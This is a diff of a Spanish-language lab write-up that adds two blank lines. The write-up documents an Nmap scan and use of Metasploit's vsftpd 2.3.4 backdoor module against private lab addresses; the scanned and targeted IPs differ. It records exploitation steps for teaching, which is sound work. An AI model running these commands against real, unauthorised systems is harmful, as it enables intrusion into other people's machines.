@@ -8,6 +8,7 @@
 ## 2. Fase de Reconocimiento (Nmap)
 Ejecuté un escaneo agresivo para detectar versiones de servicios:
 ![Captura de pantalla del escaneo de Nmap](nmap.png)
+
 `nmap -sV -p 21,22,80,445 10.0.2.3`
 
 **Resultados clave:**
@@ -18,6 +19,7 @@ Ejecuté un escaneo agresivo para detectar versiones de servicios:
 Utilicé el framework Metasploit para verificar si la versión de vsftpd era vulnerable al backdoor conocido.
 * `use exploit/unix/ftp/vsftpd_234_backdoor`
 ![Captura de pantalla del uso de msfconsole](msfconsole.png)
+
 * `set RHOSTS 10.0.2.15`
 * `run`
 
